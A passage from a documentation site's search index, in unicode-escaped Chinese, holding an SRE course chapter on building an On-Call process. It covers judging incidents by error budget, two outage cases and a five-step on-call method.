<p>\u8fd9\u4e2a\u73af\u8282\u5176\u5b9e\u4e3b\u8981\u6709\u4e24\u4ef6\u4e8b\u60c5\u8981\u505a\uff1a\u7b2c\u4e00\u4ef6\u4e8b\uff0c\u5224\u65ad\u51fa\u73b0\u7684\u95ee\u9898\u662f\u4e0d\u662f\u6545\u969c\uff1b\u7b2c\u4e8c\u4ef6\u4e8b\uff0c\u786e\u5b9a\u7531\u8c01\u6765\u54cd\u5e94\u548c\u53ec\u96c6\u3002\u6211\u4eec\u4e00\u4e00\u6765\u770b\u3002</p> <p>\u5148\u770b\u7b2c\u4e00\u4ef6\u4e8b\u3002\u6211\u4eec\u5e73\u65f6\u9047\u5230\u7684\u95ee\u9898\u5f88\u591a\uff0c\u4f46\u662f\u8fd9\u4e9b\u95ee\u9898\u7684\u5f71\u54cd\u4e0d\u89c1\u5f97\u90fd\u5f88\u4e25\u91cd\uff0c\u6216\u8005\u90fd\u9700\u8981\u6211\u4eec\u7acb\u5373\u505a\u51fa\u54cd\u5e94\u53bb\u5904\u7406\u3002\u5373\u4fbf\u662f\u6545\u969c\uff0c\u6211\u4eec\u4e5f\u4f1a\u5206\u4e0d\u540c\u7684\u54cd\u5e94\u7ea7\u522b\u53bb\u5904\u7406\u3002\u90a3\u6211\u4eec\u600e\u4e48\u5224\u65ad\u51fa\u73b0\u7684\u95ee\u9898\u662f\u4e0d\u662f\u6545\u969c\u5462\uff1f\u5982\u679c\u662f\u6545\u969c\uff0c\u6211\u4eec\u5e94\u8be5\u4ee5\u54ea\u79cd\u7ea7\u522b\u53bb\u54cd\u5e94\u5462\uff1f</p> <p>\u89e3\u51b3\u65b9\u6848\u5f88\u660e\u786e\uff0c\u5c31\u662f\u5229\u7528\u6211\u4eec\u5728\u300a04 | \u9519\u8bef\u9884\u7b97\uff1a\u8fbe\u6210\u7a33\u5b9a\u6027\u76ee\u6807\u7684\u5171\u8bc6\u673a\u5236\u300b\u4e2d\u8bb2\u8fc7\u7684\uff0c\u6839\u636e\u9519\u8bef\u9884\u7b97\u5236\u5b9a\u6545\u969c\u7b49\u7ea7\u7684\u65b9\u5f0f\u6765\u5224\u5b9a\u54cd\u5e94\u65b9\u5f0f\u3002\u6211\u4eec\u628atrade_cart\u8d2d\u7269\u8f66\u7684\u6848\u4f8b\u518d\u62ff\u51fa\u6765\uff0c\u4f60\u53ef\u4ee5\u518d\u770b\u4e0b\uff0c\u4f5c\u4e3a\u53c2\u8003\u3002</p> <p></p> <p>\u5728\u6ca1\u6709SLO\u548c\u9519\u8bef\u9884\u7b97\u8fd9\u4e2a\u4f53\u7cfb\u65f6\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u6839\u636e\u7528\u6237\u6295\u8bc9\uff0c\u6216\u5ba2\u670d\u5bf9\u540c\u4e00\u95ee\u9898\u7684\u91cd\u590d\u53cd\u9988\u6765\u5224\u65ad\u3002\u6bd4\u598210\u5206\u949f\u5185\uff0c\u6709\u8d85\u8fc750\u4e2a\u7528\u6237\u6295\u8bc9\u65e0\u6cd5\u8d2d\u4e70\u5546\u54c1\u3001\u652f\u4ed8\u4e0d\u6210\u529f\u6216\u8005\u4f18\u60e0\u5238\u672a\u751f\u6548\u7b49\u95ee\u9898\uff0c\u6211\u4eec\u5c31\u4f1a\u542f\u52a8\u5e94\u6025\u54cd\u5e94\u3002\u4e0d\u8fc7\uff0c\u4e00\u65e6\u7b49\u7528\u6237\u548c\u5ba2\u670d\u53cd\u9988\uff0c\u5c31\u8bf4\u660e\u6545\u969c\u5f71\u54cd\u5df2\u7ecf\u975e\u5e38\u6076\u52a3\u4e86\uff0c\u7528\u6237\u4e5f\u5df2\u7ecf\u5904\u4e8e\u65e0\u6cd5\u5fcd\u53d7\u7684\u72b6\u6001\u4e86\u3002</p> <p>\u663e\u7136\u8fd9\u79cd\u65b9\u5f0f\u5e76\u4e0d\u9ad8\u6548\u3002\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u642d\u5efa\u4e86SRE\u4f53\u7cfb\uff0c\u8bbe\u5b9a\u4e86SLO\uff0c\u80fd\u5bf9\u7a33\u5b9a\u6027\u8fdb\u884c\u91cf\u5316\u7ba1\u7406\uff0c\u90a3\u6211\u4eec\u5c31\u80fd\u6bd4\u7528\u6237\u66f4\u5feb\u53d1\u73b0\u95ee\u9898\u5e76\u54cd\u5e94\u95ee\u9898\u4e86\u3002\u81f3\u4e8e\u7528\u6237\u6295\u8bc9\u548c\u5ba2\u670d\u53cd\u9988\u7684\u6e20\u9053\uff0c\u53ea\u80fd\u662f\u4f5c\u4e3a\u6211\u4eec\u7684\u8f85\u52a9\u624b\u6bb5\u3002</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8bbe\u5b9a\u7684SLO\u548c\u9519\u8bef\u9884\u7b97\uff0c\u51c6\u786e\u5224\u65ad\u53d1\u751f\u7684\u95ee\u9898\u662f\u5426\u662f\u6545\u969c\uff0c\u5e76\u4f9d\u636e\u6545\u969c\u7b49\u7ea7\u51b3\u5b9a\u6211\u4eec\u91c7\u53d6\u4ec0\u4e48\u6837\u7684\u63aa\u65bd\u53bb\u5904\u7406\u8fd9\u4e9b\u95ee\u9898\uff0c\u5927\u5927\u63d0\u9ad8\u53cd\u5e94\u6548\u7387\u3002</p> <p>\u63a5\u7740\u6765\u770b\u7b2c\u4e8c\u4ef6\u4e8b\uff0c\u8c01\u6765\u54cd\u5e94\u548c\u53ec\u96c6\u3002\u8fd9\u4ef6\u4e8b\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u5982\u679c\u6211\u4eec\u5224\u5b9a\u8fd9\u4e2a\u95ee\u9898\u5c31\u662f\u4e00\u4e2a\u6545\u969c\uff0c\u9996\u5148\u8981\u6709\u4eba\u80fd\u5224\u5b9a\uff0c\u63a5\u4e0b\u6765\u9700\u8981\u54ea\u4e9b\u4eba\u6765\u4ecb\u5165\uff0c\u5e76\u80fd\u591f\u628a\u76f8\u5173\u7684\u4eba\u5458\u53ec\u96c6\u8d77\u6765\uff0c\u4e00\u8d77\u6765\u5904\u7406\u6545\u969c\u3002</p> <p>\u8fd9\u4e24\u4ef6\u4e8b\uff0c\u5176\u5b9e\u5c31\u662fSRE\u91cc\u9762\u63d0\u5230\u7684**On-Call\u673a\u5236**\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u7b2c\u4e00\u4ef6\u4e8b\u5176\u5b9e\u4e3b\u8981\u4f9d\u8d56\u4e8e\u6211\u4eec\u7684\u76d1\u63a7\u548c\u544a\u8b66\u4f53\u7cfb\u3002\u8fd9\u91cc\u6211\u60f3\u518d\u5f3a\u8c03\u4e00\u4e0b\uff0c\u5728On-Call\u9636\u6bb5\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684\u544a\u8b66\u6211\u4eec\u90fd\u8981\u54cd\u5e94\uff0c\u5982\u679c\u4e0d\u5f71\u54cd\u7a33\u5b9a\u6027\uff0c\u4e00\u822c\u7684\u544a\u8b66\u662f\u53ef\u4ee5\u964d\u4f4e\u54cd\u5e94\u7ea7\u522b\u7684\uff0c\u6211\u4eec\u53ea\u9700\u8981\u54cd\u5e94\u57fa\u4e8eSLO\u7684\u544a\u8b66\u3002</p> <p>\u6211\u548c\u5f88\u591a\u516c\u53f8\u4ea4\u6d41\u8fc7\uff0c\u53d1\u73b0\u5927\u5bb6\u90fd\u975e\u5e38\u91cd\u89c6\u76d1\u63a7\u4f53\u7cfb\u7684\u5efa\u8bbe\uff0c\u76d1\u63a7\u6307\u6807\u68b3\u7406\u5f97\u4e5f\u975e\u5e38\u5168\u9762\uff0c\u800c\u4e14\u5404\u79cd\u76d1\u63a7\u6280\u672f\u548c\u4ea7\u54c1\u90fd\u4f1a\u4f7f\u7528\u3002\u6bd4\u5982\uff0c\u4ece\u6700\u65e9\u7684Zabbix\uff0c\u4ee5\u53ca\u65e5\u5fd7\u7cfb\u7edf\u6808ELK\uff0c\u518d\u5230\u8fd1\u4e24\u5e74\u968f\u7740Kubernetes\u800c\u706b\u7206\u8d77\u6765\u7684Prometheus\u7b49\u7b49\uff0c\u4ece\u6280\u672f\u4e0a\u6765\u8bf4\uff0c\u8fd9\u4e00\u70b9\u4e0d\u662f\u592a\u5927\u7684\u95ee\u9898\u3002\u4f46\u662f\uff0c\u7b2c\u4e8c\u4ef6\u4e8b\u5f80\u5f80\u5bb9\u6613\u88ab\u6211\u4eec\u5ffd\u89c6\uff0c\u4e5f\u5c31\u662fOn-Call\u7684\u6d41\u7a0b\u673a\u5236\u5efa\u8bbe\u3002</p>"},{"location":"ops/50-sre-mogu-06/#on-call","title":"\u5173\u4e8eOn-Call\u7684\u4e24\u4e2a\u6848\u4f8b","text":"<p>\u5728\u6b63\u5f0f\u8bb2\u6d41\u7a0b\u673a\u5236\u4e4b\u524d\uff0c\u6211\u5148\u5206\u4eab\u4e24\u4e2a\u5173\u4e8eOn-Call\u7684\u6848\u4f8b\u3002</p> <p>\u7b2c\u4e00\u4e2a\u6848\u4f8b\u662f\u53d1\u751f\u5728\u6211\u81ea\u5df1\u56e2\u961f\u91cc\u7684\uff0c\u5f53\u65f6\u9047\u5230\u4e00\u6b21\u5927\u6570\u636e\u4ea7\u54c1HBase\u6545\u969c\u3002</p> <p>\u90a3\u662f\u4e00\u4e2a\u5468\u516d\u7684\u4e0b\u5348\uff0c\u8d1f\u8d23\u6570\u636e\u5e73\u53f0\u7684\u8fd0\u7ef4\u540c\u5b66\u6536\u5230\u4e86\u6545\u969c\u544a\u8b66\uff0c\u51fa\u73b0\u4e86\u90e8\u5206\u8282\u70b9\u4e0d\u53ef\u7528\uff0c\u540c\u65f6\u4f9d\u8d56\u8be5\u4ea7\u54c1\u7684\u641c\u7d22\u548c\u63a8\u8350\u7b49\u4e1a\u52a1\u4e5f\u5f00\u59cb\u53cd\u9988\u5f02\u5e38\uff0c\u8fdb\u800c\u5f71\u54cd\u5230\u5e7f\u544a\u66dd\u5149\uff0c\u5bfc\u81f4\u8d44\u91d1\u635f\u5931\u3002</p> <p>\u95ee\u9898\u51fa\u73b0\u540e\uff0c\u6211\u4eec\u5f88\u5feb\u660e\u786e\u4e86\u6545\u969c\u7684\u4e25\u91cd\u7a0b\u5ea6\uff0c\u5f00\u59cb\u8054\u7cfb\u5bf9\u5e94\u7684\u8d1f\u8d23\u4eba\u4e0a\u7ebf\u4e00\u8d77\u5904\u7406\u3002\u56e0\u4e3a\u662f\u5468\u672b\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u4e2a\u4e2a\u6253\u7535\u8bdd\u8054\u7cfb\uff0c\u540c\u65f6\u6211\u4eec\u7684HBase\u5df2\u7ecf\u4e0a\u4e91\uff0c\u6240\u4ee5\u5904\u7406\u8fc7\u7a0b\u53c8\u9700\u8981\u4e91\u4ea7\u54c1\u7684\u540c\u4e8b\u4ecb\u5165\uff0c\u8fd9\u5c31\u53c8\u6d89\u53ca\u5230\u8de8\u7ec4\u7ec7\u7684\u534f\u8c03\u3002\u4e91\u4ea7\u54c1\u5185\u90e8\u53c8\u6709\u5206\u5de5\uff0c\u4e00\u7ebf\u670d\u52a1\u3001\u4e8c\u7ebf\u4ea7\u54c1\u7814\u53d1\u652f\u6301\uff0c\u6240\u4ee5\u8fd9\u4e2a\u534f\u8c03\u8fc7\u7a0b\u53c8\u662f\u4e00\u4e2a\u6bd4\u8f83\u957f\u7684\u94fe\u6761\u3002\u518d\u52a0\u4e0a\u5176\u4ed6\u7684\u6743\u9650\u95ee\u9898\uff0c\u6240\u4ee5\u7b49\u76f8\u5173\u4eba\u5458\u5c31\u4f4d\u5f00\u59cb\u771f\u6b63\u6392\u67e5\u95ee\u9898\u7684\u65f6\u5019\uff0c\u8ddd\u79bb\u53d1\u751f\u6545\u969c\u5df2\u7ecf\u6709\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u4e86\u3002</p> <p>\u5f53\u65f6\u6211\u5927\u81f4\u7edf\u8ba1\u4e86\u4e0b\uff0c\u4ec5\u4ec5\u534f\u8c03\u4eba\u5458\u5230\u4f4d\u5e76\u4e0a\u7ebf\u5f00\u59cb\u5904\u7406\u95ee\u9898\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u82b1\u53bb\u4e8645\u5206\u949f\uff0c\u800c\u771f\u6b63\u89e3\u51b3\u95ee\u9898\u7684\u73af\u8282\u53ea\u7528\u4e8615\u5206\u949f\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u662f\u56fd\u5185\u7b2c\u4e00\u5927\u4f01\u4e1aIM\u4ea7\u54c1\u3002</p> <p>\u56e0\u4e3a\u4ea7\u54c1\u672c\u8eab\u7684\u7279\u70b9\uff0c\u6bcf\u5929\u65e9\u4e0a\u516b\u70b9\u534a\u5230\u4e5d\u70b9\uff0c\u4f1a\u6709\u4e00\u6ce2\u4f7f\u7528\u9ad8\u5cf0\uff0c\u4ea7\u54c1\u7ecf\u5e38\u5728\u8fd9\u4e2a\u65f6\u95f4\u6bb5\u51fa\u6545\u969c\u3002\u540c\u65f6\u5462\uff0c\u8fd9\u4e2a\u65f6\u95f4\u6bb5\u6b63\u597d\u662f\u4e92\u8054\u7f51\u516c\u53f8\u901a\u52e4\u65f6\u95f4\uff0c\u5927\u90e8\u5206\u6280\u672f\u5458\u5de5\u90fd\u5728\u4e0a\u73ed\u7684\u8def\u4e0a\uff0c\u6839\u672c\u6ca1\u529e\u6cd5\u5904\u7406\u95ee\u9898\uff0c\u5bfc\u81f4\u6545\u969c\u65f6\u95f4\u8fc7\u957f\u3002</p> <p>\u6240\u4ee5\u4e3a\u4e86\u4fdd\u8bc1\u53ca\u65f6\u54cd\u5e94\uff0c\u4f01\u4e1a\u51b3\u5b9a\u5206\u6279\u4e0a\u4e0b\u73ed\uff0c\u4e00\u6279\u4eba\u65e9\u4e0a\u5728\u5bb6\u503c\u5b88\uff0c\u751a\u81f3\u662f\u5b88\u5728\u7535\u8111\u65c1\u968f\u65f6\u5e94\u6025\uff0c\u5176\u4ed6\u5458\u5de5\u51c6\u65f6\u4e0a\u73ed\u3002\u7b49\u8fc7\u4e86\u4ea7\u54c1\u4f7f\u7528\u9ad8\u5cf0\u671f\uff0c\u503c\u5b88\u7684\u5458\u5de5\u518d\u9646\u7eed\u4ece\u5bb6\u91cc\u51fa\u53d1\u4e0a\u73ed\u3002\u540c\u65f6\uff0c\u4e0b\u73ed\u4e5f\u9519\u5f00\u65f6\u95f4\uff0c\u4fdd\u8bc1\u6709\u4eba\u53ef\u4ee5\u53ca\u65f6\u54cd\u5e94\u3002</p> <p>\u8fd9\u79cd\u9519\u65f6\u4fdd\u969c\u673a\u5236\uff0c\u5f88\u591a\u7535\u5546\u4f01\u4e1a\u5728\u5927\u4fc3\u4fdd\u969c\u6216\u8005\u91cd\u5927\u6d3b\u52a8\u671f\u95f4\u4e5f\u7ecf\u5e38\u7528\uff0c\u5c31\u662f**\u786e\u4fdd\u5173\u952e\u89d2\u8272\u5fc5\u987b\u5728\u7ebf\uff0c\u968f\u65f6\u5e94\u6025\u54cd\u5e94**\u3002</p> <p>\u901a\u8fc7\u4ee5\u4e0a\u4e24\u4e2a\u6848\u4f8b\uff0c\u6211\u4eec\u53d1\u73b0\u4ece\u6574\u4f53\u4e0a\u8bb2\uff0c\u5982\u679c\u8981\u7f29\u77edMTTI\u65f6\u957f\uff0c\u6280\u672f\u76f8\u5173\u7684\u76d1\u63a7\u544a\u8b66\u5f88\u91cd\u8981\uff0c\u4f46\u66f4\u5173\u952e\u7684\u662f\u4e00\u6574\u5957\u534f\u4f5c\u673a\u5236\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u50cfGoogle\u8fd9\u6837\u6280\u672f\u4f53\u7cfb\u5df2\u7ecf\u5982\u6b64\u5b8c\u5584\u7684\u516c\u53f8\uff0c\u8fd8\u8981\u5f3a\u8c03On-Call\u673a\u5236\u7684\u91cd\u8981\u6027\u3002</p> <p>\u90a3\u4e48\uff0c\u6211\u4eec\u600e\u6837\u624d\u80fd\u5efa\u8bbe\u597dOn-Call \u7684\u6d41\u7a0b\u673a\u5236\u5462\uff1f</p>"},{"location":"ops/50-sre-mogu-06/#on-call_1","title":"On-Call\u7684\u6d41\u7a0b\u673a\u5236\u5efa\u8bbe","text":"<p>\u63a5\u4e0b\u6765\uff0c\u6211\u5c31\u8ddf\u4f60\u8bf4\u8bf4\uff0c\u5728\u8611\u83c7\u8857\u6211\u4eec\u662f\u600e\u4e48\u505a\u7684\uff0c\u6211\u628a\u8fd9\u4e2a\u6d41\u7a0b\u603b\u7ed3\u4e3a**\u201cOn-Call\u5173\u952e5\u6b65\u6cd5\u201d**\u3002</p> <p>1.\u786e\u4fdd\u5173\u952e\u89d2\u8272\u5728\u7ebf\u3002</p> <p>\u8fd9\u91cc\u7684\u5173\u952e\u89d2\u8272\u4e0d\u662f\u6307\u4e00\u4e24\u4e2a\u503c\u73ed\u7684\u8fd0\u7ef4\u6216SRE\u4eba\u5458\uff0c\u800c\u662f\u6574\u4e2a\u4ea7\u54c1\u4f53\u7cfb\u4e2d\u7684\u6240\u6709\u5173\u952e\u89d2\u8272\u3002\u6bd4\u5982\u7535\u5546\u5c31\u9700\u8981\u5b89\u6392\u6838\u5fc3\u4e1a\u52a1\u5e94\u7528\uff08\u5982\u7528\u6237\u3001\u5546\u54c1\u3001\u4ea4\u6613\u3001\u4f18\u60e0\u53ca\u652f\u4ed8\u7b49\uff09\u7684Owner\uff0c\u6216Backup\u4e2d\u81f3\u5c11\u6709\u4e00\u4eba\u53c2\u4e0eOn-Call\u8f6e\u73ed\u3002\u4e0d\u8fc7\uff0c\u63a5\u6536\u6545\u969c\u544a\u8b66\u6216\u7b2c\u4e00\u65f6\u95f4\u54cd\u5e94\u6545\u969c\u7684\uff0c\u4e00\u822c\u662f\u8fd0\u7ef4\u3001PE\u6216SRE\u8fd9\u6837\u7684\u89d2\u8272\uff0c\u4e1a\u52a1\u5f00\u53d1\u540c\u4e8b\u8981\u786e\u4fdd\u53ca\u65f6\u54cd\u5e94SRE\u53d1\u8d77\u7684\u6545\u969c\u5e94\u6025\u3002</p> <p>2.\u7ec4\u7ec7War Room\u5e94\u6025\u7ec4\u7ec7\u3002</p> <p>\u6211\u4eec\u6709\u4e13\u95e8\u5904\u7406\u6545\u969c\u7684\u201c\u6d88\u9632\u7fa4\u201d\uff08\u6697\u542b\u7740\u706d\u706b\u7684\u610f\u601d\uff09\uff0c\u4f1a\u5c06\u8fd9\u4e9b\u5173\u952e\u89d2\u8272\u7eb3\u5165\u5176\u4e2d\uff0c\u5f53\u6709\u6545\u969c\u53d1\u751f\u65f6\u4f1a\u7b2c\u4e00\u65f6\u95f4\u5728\u6d88\u9632\u7fa4\u901a\u62a5\uff0c\u8fd9\u65f6\u5bf9\u5e94\u7684On-Call\u540c\u4e8b\u5c31\u8981\u7b2c\u4e00\u65f6\u95f4\u6700\u9ad8\u4f18\u5148\u7ea7\u54cd\u5e94\u547c\u53eb\uff08Page\uff09\u3002\u5982\u679c\u662f\u5de5\u4f5c\u65e5\uff0c\u5bf9\u4e8e\u4e25\u91cd\u6545\u969c\uff0c\u4f1a\u7acb\u523b\u7ec4\u7ec7\u6210\u7acbWar Room\uff0c\u8d23\u4efb\u4eba\u4f1a\u9a6c\u4e0a\u805a\u5230\u4e00\u8d77\uff1b\u5982\u679c\u662f\u975e\u5de5\u4f5c\u65f6\u95f4\uff0c\u5219\u4f1a\u901a\u8fc7\u7535\u8bdd\u4f1a\u8bae\u7684\u65b9\u5f0f\u62c9\u8d77\u865a\u62dfWar Room\u3002</p> <p>3.\u5efa\u7acb\u5408\u7406\u7684\u547c\u53eb\u65b9\u5f0f\u3002</p> <p>\u5728On-Call\u7684\u843d\u5730\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u9047\u5230\u7684\u4e00\u79cd\u60c5\u51b5\uff0c\u5c31\u662f\u8c01\u6700\u719f\u6089\u67d0\u4e2a\u7cfb\u7edf\uff0c\u8c01\u5c31\u6700\u5bb9\u6613\u88ab7*24\u5c0f\u65f6\u6253\u6270\u3002\u6bd4\u5982\u7cfb\u7edf\u6216\u5e94\u7528\u7684Owner\u6216\u8005\u662f\u67b6\u6784\u5e08\uff0c\u51fa\u73b0\u95ee\u9898\u7684\u65f6\u5019\u4e00\u5b9a\u662f\u627e\u8fd9\u4e9b\u540c\u4e8b\u5904\u7406\u7684\u6548\u7387\u6700\u9ad8\uff0c\u6240\u4ee5\u5c31\u4f1a\u9020\u6210\u8fd9\u4e9b\u540c\u4e8b\u88ab\u9ed8\u8ba4\u4e3aOn-Call\u3002</p> <p>\u4f46\u662f\u8fd9\u6837\u505a\u4f1a\u6781\u5927\u5730\u5f71\u54cd\u8fd9\u4e9b\u540c\u4e8b\u5728\u6b63\u5e38\u4e1a\u52a1\u5f00\u53d1\u4e0a\u7684\u7cbe\u529b\u6295\u5165\u3002\u4ed6\u4eec\u8981\u4e48\u603b\u662f\u88ab\u6253\u65ad\uff0c\u8981\u4e48\u5c31\u662f\u7ecf\u5e38\u901a\u5bb5\u5904\u7406\u95ee\u9898\uff0c\u5bfc\u81f4\u7b2c\u4e8c\u5929\u65e0\u6cd5\u6b63\u5e38\u5de5\u4f5c\uff0c\u751a\u81f3\u5728\u975e\u5de5\u4f5c\u65e5\u4e5f\u5f97\u4e0d\u5230\u6b63\u5e38\u7684\u4f11\u606f\u3002</p> <p>\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5efa\u8bae\u4f7f\u7528\u56fa\u5b9a\u7684On-Call\u624b\u673a\uff0c\u5efa\u7acb\u624b\u673a\u4e0e\u6240\u6709On-Call\u7cfb\u7edf\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u6bd4\u5982\u8fd9\u4e2a\u624b\u673a\u53f7\u7801\u5bf9\u5e94\u4ea4\u6613\u6838\u5fc3\u5e94\u7528\uff0c\u53e6\u4e00\u4e2a\u53f7\u7801\u5bf9\u5e94IDC\u673a\u623f\u8fd0\u7ef4\u7b49\u7b49\u3002\u8fd9\u6837\u6211\u4eec\u5728On-Call\u65f6\u5c31\u4e0d\u518d\u627e\u5177\u4f53\u7684\u54ea\u4e2a\u4eba\uff0c\u800c\u662f\u624b\u673a\u5728\u8c01\u624b\u4e2d\uff0c\u8c01\u5c31\u627f\u62c5On-Call\u804c\u8d23\u3002\u9664\u975e\u95ee\u9898\u8fdf\u8fdf\u5f97\u4e0d\u5230\u89e3\u51b3\uff0c\u6216\u8005\u9047\u5230\u4e86\u7591\u96be\u6742\u75c7\uff0c\u8fd9\u79cd\u65f6\u5019\u518d\u547c\u53eb\u5176\u4ed6\u540c\u4e8b\u53c2\u4e0e\u8fdb\u6765\u3002</p> <p>\u65e0\u8bba\u662fSRE\u3001\u67b6\u6784\u5e08\uff0c\u8fd8\u662f\u4e00\u7ebf\u5f00\u53d1\uff0c\u719f\u6089\u67d0\u4e2a\u7cfb\u7edf\u7684\u6700\u5feb\u6700\u597d\u7684\u65b9\u5f0f\u5c31\u662f\u53c2\u4e0eOn-Call\uff0c\u800c\u4e0d\u662f\u770b\u67b6\u6784\u56fe\u548c\u4ee3\u7801\u3002\u6240\u4ee5\uff0c\u6709\u6548\u7684On-Call\u673a\u5236\uff0c\u53ef\u4ee5\u8ba9\u56e2\u961f\u66f4\u6df1\u523b\u5730\u8ba4\u8bc6\u5230\u76ee\u524d\u7cfb\u7edf\u7684\u5b58\u5728\u54ea\u4e9b\u95ee\u9898\uff0c\u5bf9\u81ea\u5df1\u7684\u75db\u82e6\u72b6\u6001\u4e5f\u4f1a\u6709\u66f4\u6df1\u523b\u7684\u611f\u53d7\uff0c\u8fdb\u800c\u5bf9\u540e\u9762\u7684\u6539\u8fdb\u63aa\u65bd\u624d\u80fd\u66f4\u6709\u9488\u5bf9\u6027\u548c\u843d\u5730\u6027\u3002\u540c\u65f6\uff0cOn-Call\u4e5f\u53ef\u4ee5\u57f9\u517b\u548c\u953b\u70bc\u65b0\u4eba\u548cBackup\u89d2\u8272\uff0c\u8fd9\u4e5f\u662f\u8ba9\u65b0\u4eba\u5c3d\u5feb\u878d\u5165\u56e2\u961f\u548c\u627f\u62c5\u8d23\u4efb\u7684\u6700\u597d\u7684\u65b9\u5f0f\u3002</p> <p>4.\u786e\u4fdd\u8d44\u6e90\u6295\u5165\u7684\u5347\u7ea7\u673a\u5236\u3002</p> <p>\u8fd9\u4e2a\u8ddf\u524d\u9762\u51e0\u6761\u6709\u76f8\u5173\u6027\uff0c\u6709\u5f88\u591a\u56e2\u961f\u8ba4\u4e3aOn-Call\u5c31\u662f\u8bbe\u7f6e\u51e0\u4e2a\u4eba\u503c\u73ed\uff0c\u6240\u6709\u7684\u4e8b\u60c5\u90fd\u4ea4\u7ed9\u8fd9\u51e0\u4e2a\u4eba\u505a\uff1b\u6700\u6781\u7aef\u7684\u8fd8\u4f1a\u8ba4\u4e3a\u6240\u6709\u7684\u4e8b\u60c5\uff0c\u90fd\u5e94\u8be5\u662f\u51b2\u5728\u6700\u524d\u7ebf\u7684\u8fd0\u7ef4\u6216SRE\u6765\u5b8c\u6210\u3002\u4f46\u662f\uff0c\u5728\u5206\u5e03\u5f0f\u67b6\u6784\u8fd9\u79cd\u590d\u6742\u573a\u666f\u4e0b\uff0c\u8fd9\u79cd\u601d\u8def\u662f\u660e\u663e\u4e0d\u53ef\u884c\u7684\u3002</p> <p>\u8fd9\u91cc\u6700\u6838\u5fc3\u7684\u4e00\u70b9\u5c31\u662f\u8981\u7ed9\u5230\u8fd0\u7ef4\u548cSRE\u6388\u6743\uff0c\u5f53\u4ed6\u53d1\u73b0\u95ee\u9898\u4e0d\u662f\u81ea\u5df1\u6216\u73b0\u6709On-Call\u4eba\u5458\u80fd\u89e3\u51b3\u7684\u65f6\u5019\uff0c\u4ed6\u6709\u6743\u8c03\u52a8\u5176\u4ed6\u5fc5\u8981\u8d44\u6e90\u6295\u5165\u3002\u5982\u679c\u6545\u969c\u7b49\u7ea7\u504f\u9ad8\uff0c\u4e00\u4e0b\u65e0\u6cd5\u660e\u786e\u5177\u4f53\u627e\u54ea\u4e9b\u4eba\u5458\u6295\u5165\u7684\u65f6\u5019\uff0cSRE\u6216\u8fd0\u7ef4\u53ef\u4ee5\u76f4\u63a5\u4e0a\u5347\u5230\u81ea\u5df1\u7684\u4e3b\u7ba1\u6216\u76f8\u5173\u4e3b\u7ba1\u90a3\u91cc\uff0c\u8981\u6c42\u4e0a\u7ea7\u4e3b\u7ba1\u534f\u8c03\u8d44\u6e90\u6295\u5165\u3002\u5fc5\u8981\u65f6\uff0c\u8fd8\u53ef\u4ee5\u4e0a\u5347\u5230\u66f4\u9ad8\u7ea7\u4e3b\u7ba1\uff0c\u751a\u81f3CTO\u6216\u6280\u672fVP\u6765\u5173\u6ce8\u3002\u6240\u4ee5\uff0c\u6388\u6743\u975e\u5e38\u5173\u952e\uff0c\u8fd9\u4e00\u70b9\u7684\u5177\u4f53\u64cd\u4f5c\u5c42\u9762\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u6545\u969c\u5904\u7406\u8fc7\u7a0b\u4e2d\u518d\u8be6\u7ec6\u4ecb\u7ecd\u3002</p> <p>5.\u4e0e\u4e91\u5382\u5546\u8054\u5408\u7684On-Call\u3002</p> <p>\u73b0\u5728\u4f01\u4e1a\u4e0a\u4e91\u662f\u5927\u52bf\u6240\u8d8b\uff0c\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5bf9\u95ee\u9898\u548c\u6545\u969c\u7684\u5904\u7406\uff0c\u662f\u79bb\u4e0d\u5f00\u4e0e\u4e91\u4ea7\u54c1\u5de5\u7a0b\u5e08\u4e00\u8d77\u9ad8\u6548\u8054\u52a8\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u5e94\u8be5\u628a\u4e91\u4ea7\u54c1\u548c\u4e91\u5382\u5546\u4f5c\u4e3a\u6211\u4eec\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\uff0c\u800c\u4e0d\u662f\u5355\u7eaf\u7684\u7b2c\u4e09\u65b9\u3002\u800c\u5bf9\u4e8e\u4e91\u5382\u5546\u6765\u8bf4\uff0c\u4e5f\u8981\u8003\u8651\u628a\u5ba2\u6237\u4e1a\u52a1\u4f5c\u4e3a\u81ea\u8eab\u4e1a\u52a1\u7684\u4e00\u90e8\u5206\uff0c\u53ea\u6709\u8fd9\u6837\u53cc\u65b9\u624d\u80fd\u7d27\u5bc6\u5408\u4f5c\u3002\u6211\u4eec\u5e94\u8be5\u63d0\u524d\u505a\u597d\u4e0e\u4e91\u5382\u5546\u4e4b\u95f4\u7684\u534f\u4f5c\u78e8\u5408\uff0c\u8054\u5408\u6545\u969c\u6f14\u7ec3\uff0c\u5fc5\u8981\u7684\u6388\u6743\u7b49\u7b49\u3002</p>"},{"location":"ops/50-sre-mogu-06/#_1","title":"\u603b\u7ed3","text":"<p>\u6700\u540e\uff0c\u6211\u4eec\u505a\u4e00\u4e0b\u7b80\u5355\u7684\u603b\u7ed3\u3002</p> 